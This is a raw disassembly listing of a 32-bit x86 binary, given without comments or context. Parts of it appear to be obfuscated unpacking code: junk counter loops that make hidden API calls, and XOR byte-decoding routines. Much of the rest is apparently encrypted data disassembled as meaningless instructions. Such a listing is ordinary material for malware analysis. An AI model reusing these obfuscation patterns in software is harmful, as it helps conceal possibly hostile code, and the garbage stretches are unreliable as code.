  4038ab:	sub    DWORD PTR [eax+0x2ddd506c],ebp
  4038b1:	sti    
  4038b2:	xchg   ecx,eax
  4038b3:	xchg   ebp,eax
  4038b4:	mov    cl,0xa3
  4038b6:	ins    BYTE PTR es:[edi],dx
  4038b7:	fdivr  DWORD PTR [edx+edi*1]
  4038ba:	cli    
  4038bb:	fdiv   QWORD PTR [ecx]
  4038bd:	mov    ah,bh
  4038bf:	pop    esi
  4038c0:	xlat   BYTE PTR ds:[ebx]
  4038c1:	xchg   ebp,eax
  4038c2:	inc    esp
  4038c3:	push   esi
  4038c4:	pop    esi
  4038c5:	jp     0x4038ae
  4038c7:	data16 in al,dx
  4038c9:	iret   
  4038ca:	mov    cl,0x7b
  4038cc:	cmp    esp,DWORD PTR ds:[edi-0x1870dcc5]
  4038d3:	daa    
  4038d4:	dec    esp
  4038d5:	cmp    cl,BYTE PTR [ebp-0x141fae1a]
  4038db:	ins    DWORD PTR es:[edi],dx
  4038dc:	dec    ebp
  4038dd:	int3   
  4038de:	xor    eax,0xda17b67f
  4038e3:	sahf   
  4038e4:	int3   
  4038e5:	call   0xc203:0xc133df0c
  4038ec:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  4038f3:	mov    BYTE PTR [edi+esi*1],al
  4038f6:	mov    eax,DWORD PTR [ebp-0x4]
  4038f9:	xor    eax,ecx
  4038fb:	lea    edx,[edx+eax*1+0x32729c]
  403902:	mov    eax,DWORD PTR [ebp-0x4]
  403905:	xor    eax,ecx
  403907:	mov    esi,0xffcd8d64
  40390c:	sub    esi,eax
  40390e:	add    esi,DWORD PTR [ebp+0x10]
  403911:	cmp    edx,esi
  403913:	jbe    0x4029f8
  403919:	pop    ebx
  40391a:	mov    eax,0xf89c8530
  40391f:	pop    edi
  403920:	pop    esi
  403921:	leave  
  403922:	ret    0xc
  403925:	push   ebp
  403926:	mov    ebp,esp
  403928:	sub    esp,0x58
  40392b:	mov    ecx,DWORD PTR [ebp+0x8]
  40392e:	mov    DWORD PTR ds:0x43442d,0x11
  403938:	cmp    DWORD PTR ds:0x43442d,0x0
  40393f:	je     0x40397b
  403945:	cmp    DWORD PTR ds:0x43442d,0x17
  40394c:	jne    0x403960
  403952:	push   0x43437a
  403957:	push   DWORD PTR [ebp-0x24]
  40395a:	call   DWORD PTR ds:0x432c26
  403960:	mov    eax,ds:0x43442d
  403965:	dec    eax
  403966:	mov    ds:0x43442d,eax
  40396b:	jmp    0x403938
  403970:	mov    eax,ds:0x432dca
  403975:	add    DWORD PTR ds:0x432de2,eax
  40397b:	mov    eax,0x8a3e
  403980:	xor    ax,WORD PTR [ecx+0x20]
  403984:	mov    ecx,0x3b04
  403989:	adc    DWORD PTR ds:0x4326f4,0x34fe
  403993:	add    ax,cx
  403996:	movzx  ecx,BYTE PTR ds:0x43441d
  40399d:	sub    DWORD PTR ds:0x4343a2,ecx
  4039a3:	movzx  eax,ax
  4039a6:	adc    ecx,DWORD PTR ds:0x434429
  4039ac:	mov    DWORD PTR [ebp-0xc],eax
  4039af:	and    ecx,0x4bd2
  4039b5:	mov    BYTE PTR [ebp-0x1],0x7f
  4039b9:	xor    ecx,ecx
  4039bb:	or     ecx,DWORD PTR ds:0x434396
  4039c1:	xor    ecx,DWORD PTR ds:0x43439a
  4039c7:	mov    DWORD PTR ds:0x434396,ecx
  4039cd:	lea    eax,[ebp-0x1]
  4039d0:	mov    DWORD PTR ds:0x432dbe,0x10
  4039da:	cmp    DWORD PTR ds:0x432dbe,0x0
  4039e1:	je     0x403a23
  4039e7:	cmp    DWORD PTR ds:0x432dbe,0x1d
  4039ee:	jne    0x403a11
  4039f4:	push   0x43438a
  4039f9:	push   0x43275d
  4039fe:	push   DWORD PTR [ebp-0xc]
  403a01:	push   0x5939
  403a06:	push   0x4c17
  403a0b:	call   DWORD PTR ds:0x432c2a
  403a11:	mov    ecx,DWORD PTR ds:0x432dbe
  403a17:	dec    ecx
  403a18:	mov    DWORD PTR ds:0x432dbe,ecx
  403a1e:	jmp    0x4039da
  403a23:	mov    DWORD PTR [ebp-0x10],eax
  403a26:	mov    al,BYTE PTR [ebp-0x1]
  403a29:	adc    DWORD PTR ds:0x4326f4,ecx
  403a2f:	mov    ecx,DWORD PTR [ebp-0x10]
  403a32:	xor    al,0x47
  403a34:	sub    al,0x37
  403a36:	and    DWORD PTR ds:0x43437e,0x4d53
  403a40:	mov    BYTE PTR [ecx],al
  403a42:	mov    DWORD PTR ds:0x432dde,0x1b
  403a4c:	cmp    DWORD PTR ds:0x432dde,0x0
  403a53:	je     0x403ab0
  403a59:	cmp    DWORD PTR ds:0x432dde,0xc
  403a60:	jne    0x403a7c
  403a66:	push   0x432de6
  403a6b:	push   DWORD PTR [ebp-0x28]
  403a6e:	push   0x43439e
  403a73:	push   DWORD PTR [ebp-0x28]
  403a76:	call   DWORD PTR ds:0x432c2e
  403a7c:	cmp    DWORD PTR ds:0x432dde,0xd
  403a83:	jne    0x403a98
  403a89:	xor    ecx,ecx
  403a8b:	xor    ecx,DWORD PTR ds:0x432dde
  403a91:	dec    ecx
  403a92:	mov    DWORD PTR ds:0x432dde,ecx
  403a98:	mov    ecx,DWORD PTR ds:0x432dde
  403a9e:	dec    ecx
  403a9f:	mov    DWORD PTR ds:0x432dde,ecx
  403aa5:	jmp    0x403a4c
  403aaa:	and    ecx,0x3444
  403ab0:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403ab7:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403abe:	add    DWORD PTR ds:0x43439a,edi
  403ac4:	mov    eax,DWORD PTR [ebp-0x8]
  403ac7:	or     DWORD PTR ds:0x434396,ecx
  403acd:	mov    ecx,0x7510855
  403ad2:	jmp    0x403c17
  403ad7:	and    eax,0x555995f7
  403adc:	pop    ecx
  403add:	icebp  
  403ade:	jae    0x403a7c
  403ae0:	lods   eax,DWORD PTR ds:[esi]
  403ae1:	imul   ebp,DWORD PTR [ebx],0x6d
  403ae4:	into   
  403ae5:	xchg   ebp,eax
  403ae6:	and    eax,0x70701eec
  403aeb:	sbb    BYTE PTR [edi+0x70],bh
  403aee:	jo     0x403ab8
  403af0:	jo     0x403b1d
  403af2:	or     al,BYTE PTR [edi]
  403af4:	cld    
  403af5:	push   0x10
  403af7:	jp     0x403a84
  403af9:	jno    0x403ab5
  403afb:	xor    edx,esi
  403afd:	es ret 0xa002
  403b01:	dec    edi
  403b02:	or     eax,0x725d7cb7
  403b07:	imul   esi,DWORD PTR ds:0xd97d5ee5,0x69
  403b0e:	push   ecx
  403b0f:	xor    DWORD PTR [esi-0x1],edx
  403b12:	mov    DWORD PTR [ebx-0x423e684d],ebx
  403b18:	aaa    
  403b19:	out    0x9,al
  403b1b:	call   DWORD PTR [edi]
  403b1d:	ss dec ecx
  403b1f:	rol    BYTE PTR [ebx+eax*1],cl
  403b22:	in     al,dx
  403b23:	cmp    al,0xbb
  403b25:	xchg   BYTE PTR [ebp-0x22],ch
  403b28:	(bad)  
  403b2a:	mov    edx,0x912250b1
  403b2f:	sbb    bh,dh
  403b31:	inc    ecx
  403b32:	xchg   esi,eax
  403b33:	mov    ecx,0x33caca4b
  403b38:	mov    eax,edi
  403b3a:	daa    
  403b3b:	push   es
  403b3c:	push   eax
  403b3d:	outs   dx,BYTE PTR ds:[esi]
  403b3e:	test   bl,ch
  403b40:	pop    es
  403b41:	xor    esp,DWORD PTR [edi]
  403b43:	fld    DWORD PTR [edx]
  403b45:	mov    eax,ds:0xaf0ba2e8
  403b4a:	sub    al,0x78
  403b4c:	call   0x61c9be52
  403b51:	std    
  403b52:	sub    esi,ebx
  403b54:	sti    
  403b55:	int    0xad
  403b57:	sub    al,0xc6
  403b59:	ja     0x403b33
  403b5b:	cmp    eax,0x6e367b4e
  403b60:	push   edx
  403b61:	sub    al,0x76
  403b63:	push   ecx
  403b64:	or     eax,0xc8a7751a
  403b69:	inc    edx
  403b6a:	inc    edx
  403b6b:	sbb    BYTE PTR [ebx+0x68],ch
  403b6e:	xchg   edx,eax
  403b6f:	mov    ebx,edi
  403b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b72:	rcr    BYTE PTR [esi+edx*4],1
  403b75:	lods   al,BYTE PTR ds:[esi]
  403b76:	mov    ds:0xc27086c5,eax
  403b7b:	aaa    
  403b7c:	neg    DWORD PTR [edi-0xfc37b24]
  403b82:	mov    esi,0x4c57e8f0
  403b87:	fisttp WORD PTR [edx-0x7d]
  403b8a:	aaa    
  403b8b:	mov    ?,esi
  403b8d:	pop    es
  403b8e:	fisubr WORD PTR [edx-0x71]
  403b91:	xchg   ebx,eax
  403b92:	xor    BYTE PTR [edi+0x15419ba9],ch
  403b98:	and    al,BYTE PTR [ebp+0x390cec0c]
  403b9e:	add    BYTE PTR [esp+esi*2+0x78ceedc5],ch
  403ba5:	dec    esp
  403ba6:	or     eax,0x9caa140b
  403bab:	lods   al,BYTE PTR ds:[esi]
  403bac:	xor    al,0x8b
  403bae:	je     0x403be2
  403bb0:	ins    BYTE PTR es:[edi],dx
  403bb1:	dec    ecx
  403bb2:	push   es
  403bb3:	ror    BYTE PTR [edx+eax*4+0x521e3e11],cl
  403bba:	push   cs
  403bbb:	(bad)  [edi+0x57006213]
  403bc1:	and    BYTE PTR [ebx],ch
  403bc3:	ins    DWORD PTR es:[edi],dx
  403bc4:	ja     0x403beb
  403bc6:	arpl   si,bx
  403bc8:	mov    ds:0x7fea3652,eax
  403bcd:	and    eax,edi
  403bcf:	jmp    0x403c3e
  403bd1:	jmp    0x66628479
  403bd6:	aas    
  403bd7:	dec    esi
  403bd8:	or     ecx,DWORD PTR [ecx+0x3420eb9c]
  403bde:	and    DWORD PTR [edx+0x4aeb1242],ecx
  403be4:	inc    eax
  403be5:	mov    edi,0xf2977a29
  403bea:	pop    edx
  403beb:	adc    DWORD PTR [ecx],ebp
  403bed:	push   0x4349930f
  403bf2:	test   DWORD PTR [ebp+0x4269aefc],edx
  403bf8:	addr16 fwait
  403bfa:	xchg   ebp,eax
  403bfb:	xchg   esi,eax
  403bfc:	mov    edi,0xcfaf2ce8
  403c01:	pop    esp
  403c02:	and    bh,bl
  403c04:	and    BYTE PTR [eax],0xa1
  403c07:	out    dx,al
  403c08:	fs or  bl,ah
  403c0b:	adc    ebx,DWORD PTR [ebp+0x37]
  403c0e:	out    0xb7,al
  403c10:	mov    ds:0xb1f6e889,al
  403c15:	xor    BYTE PTR [edx+0x56],bl
  403c18:	inc    esi
  403c19:	xor    eax,ecx
  403c1b:	mov    esi,0x32729c
  403c20:	sbb    DWORD PTR ds:0x434376,0x434421
  403c2a:	add    eax,esi
  403c2c:	mov    DWORD PTR ds:0x432dd6,0x19db
  403c36:	jmp    0x403c4d
  403c3b:	mov    DWORD PTR ds:0x43436a,0x1bda
  403c45:	mov    dl,BYTE PTR [ebp-0x1]
  403c48:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403c4c:	inc    eax
  403c4d:	cmp    eax,0x40
  403c50:	jmp    0x403d95
  403c55:	sbb    bl,BYTE PTR [ebx+eiz*1+0x1981a102]
  403c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c5d:	scas   al,BYTE PTR es:[edi]
  403c5e:	xchg   ecx,eax
  403c5f:	sub    al,0x28
  403c61:	cmp    ah,dh
  403c63:	ret    
  403c64:	jl     0x403bfa
  403c66:	sbb    eax,0x7f187070
  403c6b:	jo     0x403cdd
  403c6d:	adc    BYTE PTR [esi],ch
  403c6f:	scas   eax,DWORD PTR es:[edi]
  403c70:	test   eax,0xd84555f5
  403c75:	sti    
  403c76:	mov    dl,0x8
  403c78:	and    bl,BYTE PTR [esi*2+0x3e3f219b]
  403c7f:	or     DWORD PTR [ebx-0x26a39d5b],0xffffffe4
  403c86:	sbb    DWORD PTR [esi+0x52c6f95f],edx
  403c8c:	pmullw mm3,mm3
  403c8f:	sub    ecx,eax
  403c91:	xchg   ebx,eax
  403c92:	loop   0x403c50
  403c94:	push   ds
  403c95:	xchg   edi,eax
  403c96:	icebp  
  403c97:	das    
  403c98:	out    dx,al
  403c99:	or     DWORD PTR [eax+eiz*1-0x34abfc95],edx
  403ca0:	xchg   BYTE PTR [eax+ebp*8],dl
  403ca3:	pop    edi
  403ca4:	mov    DWORD PTR [eax-0x40],esi
  403ca7:	(bad)  
  403ca8:	xor    ebx,DWORD PTR [edx+esi*4]
  403cab:	clc    
  403cac:	jns    0x403c96
  403cae:	imul   eax,DWORD PTR [ebx],0x49
  403cb1:	mov    eax,ds:0xd1d317b9
  403cb6:	fstp   DWORD PTR ds:0xc6b5e151
  403cbc:	hlt    
  403cbd:	fiadd  WORD PTR [edi-0x39]
  403cc0:	dec    esi
  403cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cc2:	inc    edx
  403cc3:	mov    dl,0xb4
  403cc5:	sbb    edi,DWORD PTR [eax-0x8b1a40d]
  403ccb:	add    ch,0xd1
  403cce:	sub    esp,0x26
  403cd1:	add    BYTE PTR [ebx],al
  403cd3:	cs add eax,0xd9dbae67
  403cd9:	or     BYTE PTR [ebp+0x2a7e5ba4],al
  403cdf:	jg     0x403d5e
  403ce1:	inc    edx
  403ce2:	dec    DWORD PTR [ebp+0x3c9918a9]
  403ce8:	mov    eax,0x20042db5
  403ced:	xchg   BYTE PTR [edi],cl
  403cef:	pop    ebx
  403cf0:	fwait
  403cf1:	jp     0x403cfe
  403cf3:	jo     0x403cb9
  403cf5:	push   ebx
  403cf6:	adc    eax,0xe78f4f11
  403cfb:	xor    eax,0xaed7774a
  403d00:	rep stos BYTE PTR es:[edi],al
  403d02:	cli    
  403d03:	sbb    BYTE PTR [ebx+ebp*2+0x5],cl
  403d07:	xchg   ebp,eax
  403d08:	lds    eax,FWORD PTR [ecx-0x32d441bf]
  403d0e:	xchg   esi,eax
  403d0f:	xchg   ebp,eax
  403d10:	lods   al,BYTE PTR ds:[esi]
  403d11:	sar    dh,cl
  403d13:	dec    ecx
  403d14:	xor    al,0xce
  403d16:	add    eax,0xa9237a38
  403d1b:	mov    eax,0x3dfd4fdc
  403d20:	out    0x15,al
  403d22:	and    eax,edi
  403d24:	addr16 (bad) 
  403d26:	out    0xea,al
  403d28:	xchg   ebp,eax
  403d29:	lahf   
  403d2a:	xor    dl,BYTE PTR [edi+0x4e30425d]
  403d30:	inc    esi
  403d31:	lock popf 
  403d33:	imul   eax,DWORD PTR [ecx-0x553949fd],0xffffffdd
  403d3a:	mov    BYTE PTR [eax],bh
  403d3c:	leave  
  403d3d:	jl     0x403d47
  403d3f:	xchg   edi,eax
  403d40:	lods   al,BYTE PTR ds:[esi]
  403d41:	dec    ebp
  403d42:	mov    eax,0x51f206cb
  403d47:	inc    edi
  403d48:	sub    al,0x68
  403d4a:	mov    DWORD PTR [edx-0x59],edx
  403d4d:	or     eax,0x8fa9c7d8
  403d52:	or     ch,BYTE PTR [edi+0x3a]
  403d55:	push   esp
  403d56:	dec    edi
  403d57:	les    esp,FWORD PTR [ebp-0x52]
  403d5a:	mov    gs,WORD PTR [ebx-0x71]
  403d5d:	mov    ecx,0xc5eb1c3f
  403d62:	sub    dl,ah
  403d64:	fstp   QWORD PTR [edi+ebp*8+0x66976e65]
  403d6b:	jecxz  0x403dd5
  403d6d:	in     al,0x5
  403d6f:	call   0xd980:0xb775f504
  403d76:	scas   eax,DWORD PTR es:[edi]
  403d77:	out    0xa,eax
  403d79:	vpsllq xmm4,xmm2,XMMWORD PTR [esi+0x4a]
  403d7e:	loopne 0x403d52
  403d80:	shl    BYTE PTR [edi],cl
  403d82:	pusha  
  403d83:	sar    DWORD PTR [ecx+ebx*1],0x2a
  403d87:	stos   DWORD PTR es:[edi],eax
  403d88:	jg     0x403d7b
  403d8a:	xchg   BYTE PTR [eax+ebx*1-0x329d3fb],ah
  403d91:	repz (bad) 
  403d93:	cli    
  403d94:	cdq    
  403d95:	jb     0x403c3b
  403d9b:	mov    edx,DWORD PTR [ebp-0x8]
  403d9e:	and    DWORD PTR ds:0x43439a,0x0
  403da8:	jmp    0x403dbb
  403dad:	xor    eax,eax
  403daf:	add    eax,DWORD PTR ds:0x43439a
  403db5:	inc    eax
  403db6:	mov    ds:0x43439a,eax
  403dbb:	cmp    DWORD PTR ds:0x43439a,0x13
  403dc2:	jae    0x403dfe
  403dc8:	cmp    DWORD PTR ds:0x43439a,0xc
  403dcf:	jne    0x403dde
  403dd5:	push   DWORD PTR [ebp-0x1c]
  403dd8:	call   DWORD PTR ds:0x4329be
  403dde:	cmp    DWORD PTR ds:0x43439a,0xb
  403de5:	jne    0x403df9
  403deb:	xor    eax,eax
  403ded:	add    eax,DWORD PTR ds:0x43439a
  403df3:	inc    eax
  403df4:	mov    ds:0x43439a,eax
  403df9:	jmp    0x403dad
  403dfe:	mov    eax,DWORD PTR [ebp-0xc]
  403e01:	xor    edx,ecx
  403e03:	add    edx,esi
  403e05:	cmp    edx,eax
  403e07:	jmp    0x403f4c
  403e0c:	inc    ecx
  403e0d:	sub    al,0xb8
  403e0f:	xor    BYTE PTR [ebp+0x72],0x41
  403e13:	jmp    0x403d9a
  403e15:	inc    ebp
  403e16:	mov    al,0x72
  403e18:	lahf   
  403e19:	test   DWORD PTR [ebx-0x1e],ebp
  403e1c:	mov    esp,0x1870701c
  403e21:	jg     0x403e93
  403e23:	jo     0x403e17
  403e25:	or     ebx,DWORD PTR [ebx-0x249bdfbe]
  403e2b:	adc    al,0x30
  403e2d:	das    
  403e2e:	(bad)  
  403e30:	inc    edi
  403e31:	sub    al,0x72
  403e33:	add    ch,al
  403e35:	sub    ch,BYTE PTR [ebp-0xda0db78]
  403e3b:	push   ebp
  403e3c:	adc    BYTE PTR [edi-0x532c33f8],0x53
  403e43:	rcr    DWORD PTR [ecx+eiz*1+0x4a],1
  403e47:	or     BYTE PTR [ecx+0x1969825c],0xb3
  403e4e:	out    dx,eax
  403e4f:	jmp    0x13e8aa5a
  403e54:	xor    DWORD PTR [ecx+0x56480001],ebx
  403e5a:	push   ss
  403e5b:	into   
  403e5c:	or     BYTE PTR [edx-0x1571ebb6],ah
  403e62:	sbb    eax,0x7c50de9f
  403e67:	mov    bl,0x4d
  403e69:	jle    0x403e38
  403e6b:	ret    
  403e6c:	and    dh,BYTE PTR [eax-0x50]
  403e6f:	fs push es
  403e71:	cdq    
  403e72:	int    0x65
  403e74:	repz ret 
  403e76:	xchg   BYTE PTR [edi+0x1bbd23e9],bl
  403e7c:	jle    0x403e4c
  403e7e:	js     0x403e3c
  403e80:	mov    dl,0x1c
  403e82:	sub    al,0xad
  403e84:	mov    ebx,0x9595d535
  403e89:	push   ecx
  403e8a:	mov    cl,0xae
  403e8c:	imul   ebp,ecx,0x5fae5916
  403e92:	add    ecx,DWORD PTR [edx]
  403e94:	xchg   edx,eax
  403e95:	and    eax,0x2ee48ee0
  403e9a:	test   al,0x43
  403e9c:	dec    esi
  403e9d:	pop    esp
  403e9e:	push   esp
  403e9f:	xchg   esp,eax
  403ea0:	retf   0x66a6
  403ea3:	cwde   
  403ea4:	loop   0x403ee4
  403ea6:	ret    
  403ea7:	popa   
  403ea8:	test   eax,0x33dd37c9
  403ead:	inc    esp
  403eae:	test   DWORD PTR [ebx+0x51380e4e],esi
  403eb4:	cmp    BYTE PTR [edx],ch
  403eb6:	popf   
  403eb7:	test   DWORD PTR [esi],esp
  403eb9:	push   edi
  403eba:	mov    ds:0x1df1569c,eax
  403ebf:	ins    DWORD PTR es:[edi],dx
  403ec0:	sahf   
  403ec1:	out    0x5b,al
  403ec3:	mov    ecx,0xc6d7ca88
  403ec8:	lock (bad) 
  403ecb:	jmp    0x403ecc
  403ecd:	ins    BYTE PTR es:[edi],dx
  403ece:	in     eax,0xff
  403ed0:	outs   dx,DWORD PTR ds:[esi]
  403ed1:	xlat   BYTE PTR ds:[ebx]
  403ed2:	(bad)  
  403ed3:	popa   
  403ed4:	xchg   esp,eax
  403ed5:	xlat   BYTE PTR ds:[ebx]
  403ed6:	push   edi
  403ed7:	out    dx,eax
  403ed8:	rcr    DWORD PTR [esi+0x1391f59c],0x12
  403edf:	jl     0x403f3f
  403ee1:	jbe    0x403ee9
  403ee3:	sbb    edi,ebp
  403ee5:	out    0xd8,eax
  403ee7:	xchg   ebx,eax
  403ee8:	mov    fs,WORD PTR [esi+0x2]
  403eeb:	push   0x69062d2e
  403ef0:	mov    esi,eax
  403ef2:	in     al,0xdf
  403ef4:	js     0x403e9e
  403ef6:	sbb    eax,DWORD PTR [esi]
  403ef8:	mov    esi,0x48c10636
  403efd:	(bad)
  403f01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f02:	rcl    DWORD PTR [eax+0x22],0x6c
  403f06:	inc    edx
  403f07:	jmp    0x403eab
  403f09:	popw   ds
  403f0b:	push   esi
  403f0c:	xchg   edi,eax
  403f0d:	push   0xfffffff6
  403f0f:	adc    BYTE PTR [ecx],bh
  403f11:	data16 arpl bx,sp
  403f14:	js     0x403f42
  403f16:	dec    ecx
  403f17:	lock fcomp st(5)
  403f1a:	daa    
  403f1b:	push   ebp
  403f1c:	inc    esi
  403f1d:	addr16 pop esp
  403f1f:	aaa    
  403f20:	scas   al,BYTE PTR es:[edi]
  403f21:	(bad)  
  403f22:	cli    
  403f23:	in     al,dx
  403f24:	fnsave ds:0x2c29e51e
  403f2a:	xor    ecx,ebp
  403f2c:	inc    ebx
  403f2d:	or     dh,BYTE PTR [esi+0x42]
  403f30:	add    BYTE PTR [ebx-0x107ea24f],dh
  403f36:	sbb    bl,bh
  403f38:	mov    BYTE PTR [edi+0x25],dh
  403f3b:	hlt    
  403f3c:	jns    0x403ed3
  403f3e:	push   esp
  403f3f:	nop
  403f40:	push   edx
  403f41:	arpl   WORD PTR [edi],bx
  403f43:	lds    ebp,FWORD PTR [edi+0x3e]
  403f46:	retf   
  403f47:	inc    ebp
  403f48:	xor    BYTE PTR [eax-0x3a],dl
  403f4b:	cmp    cl,BYTE PTR [edi]
  403f4d:	test   BYTE PTR [ebp+0x53000001],al
  403f53:	push   edi
  403f54:	mov    edi,DWORD PTR [ebp+0x8]
  403f57:	mov    eax,0x8a3e
  403f5c:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403f61:	mov    edi,0x3b04
  403f66:	add    ax,di
  403f69:	movzx  eax,ax
  403f6c:	mov    DWORD PTR [ebp-0x14],eax
  403f6f:	mov    eax,DWORD PTR [ebp+0x8]
  403f72:	movzx  eax,WORD PTR [eax+edx*4]
  403f76:	xor    eax,0x8a3e
  403f7b:	add    eax,edi
  403f7d:	mov    edi,DWORD PTR [ebp-0x14]
  403f80:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403f84:	mov    eax,DWORD PTR [ebp-0xc]
  403f87:	inc    edx
  403f88:	cmp    edx,eax
  403f8a:	jne    0x403f54
  403f90:	pop    edi
  403f91:	jmp    0x4040d6
  403f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f97:	fisubr DWORD PTR [edi-0x598e8c4b]
  403f9d:	jmp    0x4923f392
  403fa2:	xchg   edx,eax
  403fa3:	aam    0x32
  403fa5:	popa   
  403fa6:	sbb    esi,DWORD PTR fs:[eax+0x70]
  403faa:	sbb    BYTE PTR [edi+0x70],bh
  403fad:	jo     0x403f96
  403faf:	lea    ebx,[edi+0x5f993ab5]
  403fb5:	sbb    DWORD PTR [eax+0x22],esp
  403fb8:	adc    eax,0x3251baa8
  403fbd:	add    eax,0xab03a7a5
  403fc2:	jg     0x403ffe
  403fc4:	xchg   edx,eax
  403fc5:	lods   eax,DWORD PTR ds:[esi]
  403fc6:	inc    ecx
  403fc7:	xor    dh,ch
  403fc9:	dec    eax
  403fca:	aas    
  403fcb:	jb     0x403fd9
  403fcd:	xor    BYTE PTR [eax-0x14353179],cl
  403fd3:	imul   esp,DWORD PTR [eax+esi*2],0xffffffdc
  403fd7:	stc    
  403fd8:	pop    eax
  403fd9:	sahf   
  403fda:	iret   
  403fdb:	mov    bh,BYTE PTR gs:[ebx]
  403fde:	adc    BYTE PTR [ebp-0x1e],dh
  403fe1:	mov    bl,0x5f
  403fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe4:	(bad)  
  403fe5:	mov    ebx,0x1e331b81
  403fea:	ins    BYTE PTR es:[edi],dx
  403feb:	leave  
  403fec:	fwait
  403fed:	lods   al,BYTE PTR ds:[esi]
  403fee:	jae    0x403faf
  403ff0:	pop    es
  403ff1:	dec    ecx
  403ff2:	inc    esp
  403ff3:	dec    esi
  403ff4:	lea    esi,[edi-0x76d8f0a4]
  403ffa:	push   0xe48ad2db
  403fff:	arpl   WORD PTR [ebp+0x0],ax
  404002:	jecxz  0x403fb1
  404004:	inc    edx
  404005:	or     DWORD PTR [eax],eax
  404007:	mov    ah,0x58
  404009:	in     al,0x83
  40400b:	clc    
  40400c:	sbb    eax,DWORD PTR [eax]
  40400e:	add    eax,0x50ae0185
  404013:	into   
  404014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404015:	mov    fs,WORD PTR [eax+0x31]
  404018:	mov    edi,DWORD PTR [edi-0x53]
  40401b:	and    DWORD PTR [ecx+0x3e],ebp
  40401e:	shr    DWORD PTR [edi-0x15],1
  404021:	xchg   esi,eax
  404022:	shl    DWORD PTR [ecx],0xaa
  404025:	cmp    dh,BYTE PTR ds:0xd24bfaba
  40402b:	ja     0x403fdb
  40402d:	daa    
  40402e:	adc    DWORD PTR [edi+0x56],esp
  404031:	sahf   
  404032:	sti    
  404033:	mov    bh,0xc0
  404035:	xor    ch,BYTE PTR ds:0x49c7ebe9
  40403b:	mov    ebp,0x9ff1ba4a
  404040:	test   ecx,ecx
  404042:	fimul  DWORD PTR [edi+0xaabf084]
  404048:	ins    BYTE PTR es:[edi],dx
  404049:	mov    ebx,0xbb10d7de
  40404e:	fisttp QWORD PTR [ebx]
  404050:	(bad)  
  404051:	mov    esi,0x6f7cccfe
  404056:	cmp    BYTE PTR [eax-0x18],al
  404059:	test   BYTE PTR [edx],dh
  40405b:	sbb    eax,0x9eea6d2e
  404060:	dec    ebx
  404061:	xor    edi,DWORD PTR [ebx+0x12a6573c]
  404067:	cmp    DWORD PTR [ebp+0x32],ecx
  40406a:	push   0xc1ec5e8a
  40406f:	repnz pop es
  404071:	jmp    0x9ad88f88
  404076:	data16 (bad) 
  404078:	out    dx,eax
  404079:	pop    esi
  40407a:	les    esp,FWORD PTR ss:[esi+0xabeaede]
  404081:	clc    
  404082:	lock ds test al,0x9f
  404086:	mov    ebx,0x75588a19
  40408b:	lods   eax,DWORD PTR ds:[esi]
  40408c:	push   edi
  40408d:	repz add cl,bl
  404090:	in     al,dx
  404091:	mov    eax,ds:0x8850200f
  404096:	loop   0x4040da
  404098:	icebp  
  404099:	out    0x82,al
  40409b:	(bad)  
  40409c:	pop    eax
  40409d:	int    0x29
  40409f:	out    0xaa,eax
  4040a1:	mov    edx,0x8bbf8e08
  4040a6:	push   esi
  4040a7:	out    dx,al
  4040a8:	loop   0x404051
  4040aa:	(bad)  
  4040ab:	pop    ecx
  4040ac:	adc    al,0xc0
  4040ae:	es aas 
  4040b0:	jmp    0x7d0b22dd
  4040b5:	and    al,0x91
  4040b7:	mov    eax,0xee7af58f
  4040bc:	in     eax,0x14
  4040be:	js     0x404128
  4040c0:	not    DWORD PTR [ebp+edi*2-0x3]
  4040c4:	add    dh,dh
  4040c6:	fs mov ch,0x0
  4040c9:	cwde   
  4040ca:	mov    dh,0xac
  4040cc:	push   ss
  4040cd:	test   BYTE PTR [ecx],al
  4040cf:	jae    0x4040eb
  4040d1:	sub    BYTE PTR [ebx],ch
  4040d3:	mov    BYTE PTR [edi+0x458b5b0e],dl
  4040d9:	clc    
  4040da:	mov    edx,DWORD PTR [ebp+0x10]
  4040dd:	jmp    0x404222
  4040e2:	aaa    
  4040e3:	ins    DWORD PTR es:[edi],dx
  4040e4:	pop    ss
  4040e5:	int3   
  4040e6:	push   ebp
  4040e7:	jb     0x4040dc
  4040e9:	jno    0x404096
  4040eb:	pop    ebx
  4040ec:	imul   edi,DWORD PTR [edx+0x4d069260],0xc
  4040f3:	sbb    DWORD PTR [eax+0x70],esi
  4040f6:	sbb    BYTE PTR [edi+0x70],bh
  4040f9:	jo     0x40415c
  4040fb:	push   ds
  4040fc:	ds (bad) 
  4040fe:	idiv   BYTE PTR [esi+0x51]
  404101:	fstp   TBYTE PTR [esi+ebx*2]
  404104:	dec    ebx
  404105:	out    dx,al
  404106:	jns    0x40414e
  404108:	inc    esi
  404109:	je     0x404186
  40410b:	adc    ebx,DWORD PTR [edi-0x52]
  40410e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40410f:	fs mov ebp,ds
  404112:	sti    
  404113:	mov    edx,0xfe6a61e9
  404118:	bswap  eax
  40411a:	jge    0x4040b6
  40411c:	gs or  al,0x4f
  40411f:	adc    eax,DWORD PTR [edi+ebx*1+0x2cea23f4]
  404126:	sub    al,0x71
  404128:	mov    cl,0xf2
  40412a:	cs push ds
  40412c:	pop    eax
  40412d:	mov    cl,0xb5
  40412f:	aas    
  404130:	mov    edx,0x760b9621
  404135:	xchg   eax,edx
  404137:	stos   BYTE PTR es:[edi],al
  404138:	fdiv   DWORD PTR [esp+esi*4]
  40413b:	shl    al,0xcf
  40413e:	push   edx
  40413f:	icebp  
  404140:	pop    edx
  404141:	sub    bl,BYTE PTR [eax-0x4d]
  404144:	cwde   
  404145:	call   0xf7c1:0x95213af3
  40414c:	sbb    DWORD PTR [ebp-0x593a8bba],edi
  404152:	push   es
  404153:	cmp    eax,0xc2afe8c8
  404158:	and    dl,BYTE PTR [edi+0x4f]
